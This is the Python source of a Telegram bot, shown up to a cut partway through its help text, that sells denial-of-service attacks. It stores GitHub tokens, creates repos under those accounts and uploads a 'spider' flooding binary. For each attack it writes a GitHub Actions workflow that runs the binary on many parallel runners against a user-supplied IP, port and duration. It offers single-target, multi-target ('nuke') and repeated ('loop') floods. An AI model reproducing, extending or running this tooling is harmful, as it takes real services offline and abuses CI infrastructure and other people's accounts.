import os
import json
import logging
import time
import uuid
import asyncio
import random
import traceback
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
RUNNERS = int(os.environ.get("RUNNERS", "10"))
THREADS_PER_RUNNER = int(os.environ.get("THREADS_PER_RUNNER", "200"))

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}

# ===== SAFE FILE OPS =====
def load_json(filename, default=None):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ===== INIT =====
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== VALIDATION & HELPERS =====
# ============================================================

def validate_github_token(token):
    try:
        if not token or len(token) < 20:
            return False, "Token too short"
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted"
        return True, user.login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)"
        elif e.status == 403:
            return False, "Rate limited (403)"
        elif e.status == 404:
            return False, "Token has no permissions (404)"
        else:
            return False, f"GitHub error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:40]}"

def auto_remove_expired():
    global github_tokens
    if not github_tokens:
        return 0
    removed = 0
    valid = []
    for td in github_tokens:
        token = td.get('token')
        if not token:
            removed += 1
            continue
        is_valid, info = validate_github_token(token)
        if is_valid:
            td['username'] = info
            valid.append(td)
        else:
            removed += 1
            logger.warning(f"🗑️ Removed invalid token: {token[:10]}... - {info}")
    if removed > 0:
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        logger.info(f"✅ Auto-removed {removed} invalid tokens. Remaining: {len(github_tokens)}")
    return removed

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ===== ATTACK MANAGEMENT =====
def start_attack(attack_id, ip, port, time_val, user_id, token_used=None):
    active_attacks[attack_id] = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "start_time": time.time(),
        "timer_task": None,
        "token": token_used
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== BINARY UPLOAD (unchanged logic, cartoon message) =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b> – only system admins can deploy binaries.", parse_mode='HTML')
            return ConversationHandler.END
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ <b>Token Vault Empty</b>\nAdd tokens via <code>/addtoken</code>", parse_mode='HTML')
            return ConversationHandler.END
        await update.message.reply_text(
            "📤 <b>DEPLOY BINARY</b>\n\n"
            "Send me the <code>spider</code> binary file.\n"
            "File must be named exactly: <code>spider</code>\n"
            "Type <code>/cancel</code> to abort.",
            parse_mode='HTML'
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return ConversationHandler.END
        if not update.message.document:
            await update.message.reply_text("❌ Please send a file.", parse_mode='HTML')
            return WAITING_FOR_BINARY
        file = update.message.document
        if file.file_name != "spider":
            await update.message.reply_text(f"❌ File must be named <code>spider</code>. Found: <code>{file.file_name}</code>", parse_mode='HTML')
            return WAITING_FOR_BINARY
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens. Add with /addtoken", parse_mode='HTML')
            return ConversationHandler.END

        progress = await update.message.reply_text("⏳ <b>Uploading to all repositories...</b>", parse_mode='HTML')
        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)

        success_count = 0
        fail_count = 0
        results = []
        for token_data in github_tokens:
            token = token_data.get('token')
            repo_name = token_data.get('repo')
            username = token_data.get('username', 'unknown')
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    existing = repo.get_contents("spider")
                    repo.update_file("spider", "Update spider binary", content, existing.sha)
                    results.append((username, True, "✅ Updated"))
                except Exception:
                    repo.create_file("spider", "Add spider binary", content)
                    results.append((username, True, "✅ Created"))
                success_count += 1
            except Exception as e:
                results.append((username, False, f"❌ {str(e)[:40]}"))
                fail_count += 1

        msg = f"<b>✅ BINARY DEPLOYMENT COMPLETE</b>\n"
        msg += f"📊 Success: {success_count} | Failed: {fail_count} | Total: {len(github_tokens)}\n"
        for username, success, status in results:
            emoji = "✅" if success else "❌"
            msg += f"{emoji} @{username}: {status}\n"
        await progress.edit_text(msg, parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN COMMANDS (Cartoon Vault) =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b> – only admins can inject tokens.", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 <b>Usage:</b> <code>/addtoken &lt;github_token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0].strip()
        is_valid, info = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"❌ <b>Invalid Token</b>\n{info}", parse_mode='HTML')
            return
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("⚠️ Token already exists in vault.", parse_mode='HTML')
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(
                    f"⚠️ User @{username} already has a token.\n"
                    f"Existing repo: <code>{t.get('repo')}</code>\n"
                    f"Remove it first with <code>/removetoken</code>.",
                    parse_mode='HTML'
                )
                return
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False)
        try:
            repo.create_file(".github/workflows/main.yml", "Init workflow", "")
        except:
            pass
        github_tokens.append({
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat()
        })
        save_json('github_tokens.json', github_tokens)
        await update.message.reply_text(
            f"<b>🔑 VAULT OF POWER – TOKEN INJECTED!</b>\n"
            f"👤 <b>Cartoon Villain:</b> @{username}\n"
            f"📁 <b>Secret Lair:</b> <code>{repo_name}</code>\n"
            f"📊 <b>Vault Size:</b> {len(github_tokens)} 🔥",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        removed = auto_remove_expired()
        if not github_tokens:
            msg = "📭 <b>Vault is Empty!</b>"
            if removed > 0:
                msg = f"🧹 <b>Eeek! Removed {removed} expired ghosts.</b>\n📭 Vault is now empty."
            await update.message.reply_text(msg, parse_mode='HTML')
            return
        msg = "<b>🔐 THE SECRET VAULT OF POWER</b>\n\n"
        if removed > 0:
            msg += f"🧹 Removed {removed} expired ghosts\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            msg += f"{i}. 👤 @{t.get('username', 'Unknown')} – <code>{token_short}</code>\n"
            msg += f"   📁 <code>{t['repo']}</code>\n\n"
        msg += f"📊 <b>Total active power sources:</b> {len(github_tokens)}"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("📭 No tokens to check.", parse_mode='HTML')
            return
        removed = auto_remove_expired()
        msg = "<b>🔍 HEALTH CHECK – VILLAIN STATUS</b>\n\n"
        msg += f"📊 Total: {len(github_tokens)}\n"
        msg += f"🧹 Expired removed: {removed}\n\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            msg += f"{i}. @{t.get('username', 'Unknown')} – <code>{token_short}</code> ✅ <b>READY TO RUMBLE</b>\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/removetoken &lt;token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0]
        found = False
        for i, t in enumerate(github_tokens):
            if t.get('token') == token:
                github_tokens.pop(i)
                save_json('github_tokens.json', github_tokens)
                found = True
                break
        if found:
            await update.message.reply_text(f"✅ Token removed. Remaining: {len(github_tokens)}", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Token not found.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("📭 Vault already empty.", parse_mode='HTML')
            return
        count = len(github_tokens)
        if len(context.args) == 1 and context.args[0].lower() == "confirm":
            github_tokens.clear()
            save_json('github_tokens.json', github_tokens)
            await update.message.reply_text(f"🗑️ Cleared {count} tokens.", parse_mode='HTML')
        else:
            await update.message.reply_text(f"⚠️ Delete ALL {count} tokens? Use <code>/cleartokens confirm</code>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== CORE ATTACK FUNCTION =====
# ============================================================

async def launch_attack(update, context, ip, port, time_val, user_id, token_override=None):
    auto_remove_expired()
    if not github_tokens:
        await update.message.reply_text("❌ <b>No GitHub Tokens</b>\nAdd one with <code>/addtoken</code>", parse_mode='HTML')
        return None

    if token_override:
        token_data = next((t for t in github_tokens if t['token'] == token_override), None)
        if not token_data:
            await update.message.reply_text("❌ Token override not found.", parse_mode='HTML')
            return None
    else:
        token_data = random.choice(github_tokens)

    token = token_data['token']
    repo_name = token_data['repo']
    username = token_data['username']

    g = Github(token)
    repo = g.get_repo(repo_name)

    try:
        repo.get_contents("spider")
    except:
        await update.message.reply_text(
            "❌ <b>Binary Missing</b>\n'<code>spider</code>' not found in repo.\nDeploy with <code>/binary_upload</code>",
            parse_mode='HTML'
        )
        return None

    yml_content = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [{','.join(str(i) for i in range(1, RUNNERS+1))}]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {time_val} {THREADS_PER_RUNNER}
"""
    try:
        file = repo.get_contents(YML_FILE_PATH)
        repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
    except:
        try:
            repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
        except:
            repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml_content)

    attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
    start_attack(attack_id, ip, port, time_val, user_id, token)
    return attack_id, token_data

# ============================================================
# ===== ATTACK (CARTOON VILLAIN MODE) =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b>\nYou don't have permission to launch strikes.", parse_mode='HTML')
            return
        if len(context.args) != 3:
            await update.message.reply_text(
                "📖 <b>Usage:</b> <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n\n"
                "💡 Example: <code>/attack 1.1.1.1 443 60</code>\n"
                "⏱️ Time range: 5 – 3600 seconds",
                parse_mode='HTML'
            )
            return

        ip, port_str, time_str = context.args
        try:
            port = int(port_str)
            time_val = int(time_str)
        except:
            await update.message.reply_text("❌ <b>Invalid Input</b>\nPort and time must be numbers.", parse_mode='HTML')
            return
        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ <b>Invalid Port</b>\nPort must be between 1 and 65535.", parse_mode='HTML')
            return
        if time_val < 5 or time_val > 3600:
            await update.message.reply_text("❌ <b>Invalid Duration</b>\nTime must be 5–3600 seconds.", parse_mode='HTML')
            return

        result = await launch_attack(update, context, ip, port, time_val, user_id)
        if not result:
            return
        attack_id, token_data = result

        async def auto_finish():
            await asyncio.sleep(time_val + 10)
            finish_attack(attack_id)
            logger.info(f"✅ Auto-finished attack {attack_id}")
        timer_task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = timer_task

        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        finish_time = (datetime.now() + timedelta(seconds=time_val)).strftime("%Y-%m-%d %H:%M:%S")
        actions_url = f"https://github.com/{token_data['repo']}/actions"

        threat = "🟢 MODERATE" if time_val <= 60 else ("🟡 HIGH" if time_val <= 300 else "🔴 CRITICAL")

        message = (
            f"<b>💥🦸 VILLAIN ARC ACTIVATED! 🦸💥</b>\n"
            f"<i>\"With great power comes great electricity bill!\"</i>\n\n"
            f"<pre>\n"
            f"╔══════════════════════════════════════════════════════╗\n"
            f"║  🎯 TARGET          │  {ip}:{port}                      ║\n"
            f"║  ⏱️ DURATION        │  {time_val}s                          ║\n"
            f"║  ⚙️ RUNNERS         │  {RUNNERS} Parallel (Over 9000!)    ║\n"
            f"║  🧵 THREADS/RUNNER  │  {THREADS_PER_RUNNER}                  ║\n"
            f"║  🔥 TOTAL FIREPOWER │  {RUNNERS * THREADS_PER_RUNNER} Threads ║\n"
            f"║  📁 SECRET LAIR     │  {token_data['repo']} ║\n"
            f"║  👤 HENCHMAN        │  @{token_data['username']}                  ║\n"
            f"║  🆔 STRIKE ID       │  {attack_id} ║\n"
            f"║  🕒 LAUNCHED        │  {start_time} ║\n"
            f"║  ⏳ ETA             │  {finish_time} ║\n"
            f"║  ⚡ THREAT LEVEL    │  {threat}                     ║\n"
            f"╚══════════════════════════════════════════════════════╝\n"
            f"</pre>\n"
            f"📊 <b>LIVE FEED:</b> <a href='{actions_url}'>GitHub Actions Dashboard</a>\n"
            f"🛑 <b>ABORT:</b> <code>/stop</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>💥 BOOM! KABOOM! Strike #{attack_counters.get(str(user_id), 0)} launched. </i>💥"
        )
        await update.message.reply_text(message, parse_mode='HTML', disable_web_page_preview=True)

    except Exception as e:
        await update.message.reply_text(f"❌ <b>Deployment Failed</b>\n<code>{str(e)[:200]}</code>", parse_mode='HTML')

# ============================================================
# ===== NUKE (CARTOON CHAOS) =====
# ============================================================

async def nuke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b>", parse_mode='HTML')
            return
        if len(context.args) < 2:
            await update.message.reply_text(
                "📖 <b>Usage:</b> <code>/nuke &lt;ip:port&gt; [ip:port ...] &lt;time&gt;</code>\n"
                "Example: <code>/nuke 1.1.1.1:80 2.2.2.2:443 60</code>",
                parse_mode='HTML'
            )
            return

        targets = []
        time_val = None
        for arg in context.args:
            if ":" in arg:
                parts = arg.split(":")
                if len(parts) == 2:
                    try:
                        ip = parts[0]
                        port = int(parts[1])
                        if 1 <= port <= 65535:
                            targets.append((ip, port))
                    except:
                        pass
            else:
                try:
                    time_val = int(arg)
                except:
                    pass
        if not targets or not time_val:
            await update.message.reply_text("❌ Invalid format. Use: <code>/nuke ip:port ip:port ... time</code>", parse_mode='HTML')
            return
        if time_val < 5 or time_val > 3600:
            await update.message.reply_text("❌ Time must be 5–3600 seconds.", parse_mode='HTML')
            return

        if len(github_tokens) < len(targets):
            await update.message.reply_text(f"⚠️ Need at least {len(targets)} tokens, but only {len(github_tokens)} available.", parse_mode='HTML')
            return

        await update.message.reply_text(
            f"<b>💣☢️ NUCLEAR LAUNCH DETECTED! ☢️💣</b>\n"
            f"<i>\"I'm a genius! Oh no!\" – Tom & Jerry style</i>\n"
            f"🎯 <b>Targets:</b> {len(targets)} evil IPs\n"
            f"⏱️ <b>Countdown:</b> {time_val}s",
            parse_mode='HTML'
        )

        tasks = []
        for idx, (ip, port) in enumerate(targets):
            token_override = github_tokens[idx % len(github_tokens)]['token']
            tasks.append(launch_attack(update, context, ip, port, time_val, user_id, token_override))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        success_attacks = []
        for res in results:
            if isinstance(res, tuple) and res[0]:
                attack_id, token_data = res
                success_attacks.append((attack_id, token_data))
            else:
                logger.error(f"Nuke attack failed: {res}")

        for attack_id, token_data in success_attacks:
            async def auto_finish(aid=attack_id):
                await asyncio.sleep(time_val + 10)
                finish_attack(aid)
                logger.info(f"✅ Auto-finished nuke attack {aid}")
            timer_task = asyncio.create_task(auto_finish())
            active_attacks[attack_id]["timer_task"] = timer_task

        await update.message.reply_text(
            f"<b>🤡 CARTOON CHAOS COMPLETE! 🤡</b>\n"
            f"✅ <b>Deployed:</b> {len(success_attacks)}/{len(targets)} raids\n"
            f"🔥 <b>Total Firepower:</b> {len(success_attacks) * RUNNERS * THREADS_PER_RUNNER} threads\n"
            f"<i>💣 That's a lot of damage! – Flex Tape reference</i>",
            parse_mode='HTML'
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Nuke error: {str(e)[:200]}", parse_mode='HTML')

# ============================================================
# ===== LOOP (GROUNDHOG DAY) =====
# ============================================================

async def loop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b>", parse_mode='HTML')
            return
        if len(context.args) != 4:
            await update.message.reply_text(
                "📖 <b>Usage:</b> <code>/loop &lt;ip&gt; &lt;port&gt; &lt;duration&gt; &lt;iterations&gt;</code>\n"
                "Example: <code>/loop 1.1.1.1 443 30 5</code>",
                parse_mode='HTML'
            )
            return

        ip, port_str, dur_str, iter_str = context.args
        try:
            port = int(port_str)
            duration = int(dur_str)
            iterations = int(iter_str)
        except:
            await update.message.reply_text("❌ All arguments must be numbers.", parse_mode='HTML')
            return
        if not (1 <= port <= 65535) or duration < 5 or duration > 3600 or iterations < 1 or iterations > 20:
            await update.message.reply_text("❌ Invalid values. Port 1-65535, duration 5-3600, iterations 1-20.", parse_mode='HTML')
            return

        await update.message.reply_text(
            f"<b>🔄 GROUNDHOG DAY ATTACK! 🔄</b>\n"
            f"<i>\"I got you, baby!\" – Bill Murray style</i>\n"
            f"🎯 <b>Target:</b> {ip}:{port}\n"
            f"🔄 <b>Rounds:</b> {iterations} x {duration}s",
            parse_mode='HTML'
        )

        for i in range(iterations):
            await update.message.reply_text(f"⏳ <b>Round {i+1}/{iterations}</b> – <i>\"Here we go again!\"</i>")
            result = await launch_attack(update, context, ip, port, duration, user_id)
            if not result:
                await update.message.reply_text(f"❌ Round {i+1} failed, stopping loop.")
                break
            attack_id, token_data = result
            async def auto_finish(aid=attack_id):
                await asyncio.sleep(duration + 5)
                finish_attack(aid)
            timer_task = asyncio.create_task(auto_finish())
            active_attacks[attack_id]["timer_task"] = timer_task
            await asyncio.sleep(2)

        await update.message.reply_text(
            f"<b>✅ LOOP COMPLETE – ALL ROUNDS FINISHED! ✅</b>\n"
            f"<i>\"I'm not stuck with you, you're stuck with me!\"</i>",
            parse_mode='HTML'
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Loop error: {str(e)[:200]}", parse_mode='HTML')

# ============================================================
# ===== STATUS (CARTOON RADAR) =====
# ============================================================

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return

        if not active_attacks:
            await update.message.reply_text(
                "<b>📡 CARTOON RADAR – 🟢 IDLE</b>\n\n"
                "<pre>\n"
                "╔══════════════════════════════════════════╗\n"
                "║  STATUS      :  🟢 READY               ║\n"
                "║  ACTIVE RAIDS:  0                      ║\n"
                "║  FIREPOWER   :  0 Threads             ║\n"
                "╚══════════════════════════════════════════╝\n"
                "</pre>\n"
                "<i>No active strikes. Deploy with /attack</i>\n"
                "<b>🎬 \"The silence before the storm.\"</b>",
                parse_mode='HTML'
            )
            return

        total_threads = len(active_attacks) * RUNNERS * THREADS_PER_RUNNER
        msg = "<b>📡🔥 CARTOON RADAR – LIVE FEED 🔥📡</b>\n\n"
        msg += "<pre>\n"
        msg += "╔══════════════════════════════════════════════════════════╗\n"
        msg += f"║  TOTAL RAIDS :  {len(active_attacks)}                                     ║\n"
        msg += f"║  TOTAL FIREPOWER :  {total_threads} Threads                    ║\n"
        msg += "╠══════════════════════════════════════════════════════════╣\n"

        for aid, data in list(active_attacks.items())[:5]:
            elapsed = int(time.time() - data['start_time'])
            remaining = data['time'] - elapsed
            if remaining < 0:
                remaining = 0
            progress = int((elapsed / data['time']) * 10)
            if progress > 10:
                progress = 10
            bar = "▓" * progress + "░" * (10 - progress)
            msg += f"║  🎯 {data['ip']}:{data['port']}                                     ║\n"
            msg += f"║     ⏱️  {bar}  {elapsed}s / {data['time']}s (Rem: {remaining}s)  ║\n"
            msg += f"║     🆔  {aid[:12]}..                                      ║\n"
            msg += "╠══════════════════════════════════════════════════════════╣\n"

        if len(active_attacks) > 5:
            msg += f"║  ... and {len(active_attacks)-5} more raids cooking!                    ║\n"
            msg += "╠══════════════════════════════════════════════════════════╣\n"

        msg += "╚══════════════════════════════════════════════════════════╝\n"
        msg += "</pre>\n"
        msg += f"<i>🛑 Use /stop to abort all missions. </i>💀"
        await update.message.reply_text(msg, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== STOP (RETREAT) =====
# ============================================================

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not active_attacks:
            await update.message.reply_text("✅ No active raids to abort.", parse_mode='HTML')
            return
        count = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        await update.message.reply_text(
            f"<b>🏳️‍🌈 RETREAT!!! 🏳️‍🌈</b>\n"
            f"<i>\"That's all folks!\" – Looney Tunes style</i>\n\n"
            f"💥 Terminated <b>{count}</b> raid(s) successfully.\n"
            f"☠️ System is now idle. All clear.\n"
            f"🐶 <b>Courage the Cowardly Dog says:</b> \"Stupid computer!\"",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== START (CARTOON NETWORK HUB) =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        total_attacks = sum(attack_counters.values())
        user_attacks = attack_counters.get(str(user_id), 0)

        if can_attack(user_id):
            keyboard = [
                [InlineKeyboardButton("⚡ Launch Strike", callback_data="attack_help")],
                [InlineKeyboardButton("📡 Live Feed", callback_data="status")],
                [InlineKeyboardButton("🛑 Abort Mission", callback_data="stop")],
            ]
            if is_owner(user_id):
                keyboard.append([InlineKeyboardButton("🔧 Admin Console", callback_data="admin_panel")])

            await update.message.reply_text(
                f"<b>🎬 TOON TERROR – CARTOON NETWORK ATTACK ZONE 🎬</b>\n\n"
                f"<pre>\n"
                f"╔═══════════════════════════════════════════╗\n"
                f"║  👤 HERO/VILLAIN :  @{username:<12} ║\n"
                f"║  🎯 ROLE          :  {'👑 OWNER' if is_owner(user_id) else '✅ APPROVED':<12} ║\n"
                f"║  ⚙️ WORKERS       :  {RUNNERS} Parallel       ║\n"
                f"║  🧵 THREADS       :  {THREADS_PER_RUNNER} / Worker ║\n"
                f"║  🔥 TOTAL LOAD    :  {RUNNERS * THREADS_PER_RUNNER} Threads ║\n"
                f"║  📡 STATUS        :  🟢 ONLINE            ║\n"
                f"║  🚀 YOUR STRIKES  :  {user_attacks:<5}                     ║\n"
                f"║  🌍 TOTAL RAIDS   :  {total_attacks:<5}                     ║\n"
                f"╚═══════════════════════════════════════════╝\n"
                f"</pre>\n"
                f"<b>Quick Deploy:</b> <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
                f"<b>Multi‑target:</b> <code>/nuke ip:port ip:port ... time</code>\n"
                f"<b>Loop:</b> <code>/loop ip port duration iterations</code>\n"
                f"<i>✨ \"I am the one who knocks!\" – Heisenberg</i>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
                pending_users.append({"user_id": user_id, "username": username, "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                save_json('pending_users.json', pending_users)
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            int(owner_id),
                            f"📥 <b>Access Request</b>\n"
                            f"👤 @{username}\n"
                            f"🆔 <code>{user_id}</code>\n"
                            f"Use: <code>/approve {user_id} 7</code>",
                            parse_mode='HTML'
                        )
                    except:
                        pass
            await update.message.reply_text(
                "⛔ <b>Access Denied</b>\n\n"
                "Your request has been submitted to the system admin.\n"
                "Please wait for approval.\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "<i>\"Patience, young grasshopper.\"</i>",
                parse_mode='HTML'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== HELP (CARTOON HANDBOOK) =====
# ============================================================

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>📖 THE ULTIMATE HANDBOOK OF DESTRUCTION 📖</b>\n"
        "<i>\"Read it, or face the consequences!\"</i>\n\n"
        "<b>💀 DESTRUCTION MOVES</b>\n"
        "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code> – Launch a full‑scale strike\n"
        "<code>/nuke &lt;ip:port&gt; ... &lt;time&gt;</code> – Multi‑target annihilation\n"
        "<code>/loop &lt;ip&gt; &lt;port&gt; &lt;duration&gt; &lt;iterations&gt;</code> – Repeated assault\n"
        "<code>/status</code> – Live cartoon radar\n"
        "<code>/stop</code> – Emergency retreat\n\n"
        "<b>🦸 SECRET LAIR (ADMIN)</b>\n"
        "<code>/addtoken &lt;token&gt;</code> – Inject a GitHub token\n"
        "<code>/removetoken &lt;token&gt;</code> – Remove a token\n"
        "<code>/checktokens</code> – Health check on tokens\n"
        "<code>/cleartokens confirm</code> – Wipe the vault\n"
        "<code>/tokens</code> – List all tokens\n"
        "<code>/binary_upload</code> – Deploy the spider binary\n"
        "<code>/approve &lt;id&gt; &lt;days&gt;</code> – Grant access\n"
        "<code>/remove &lt;id&gt;</code> – Revoke access\n"
        "<code>/users</code> – List approved users\n"
        "<code>/pending</code> – Pending requests\n"
        "<code>/broadcast &lt;msg&gt;</code> – Send announcement\n\n"
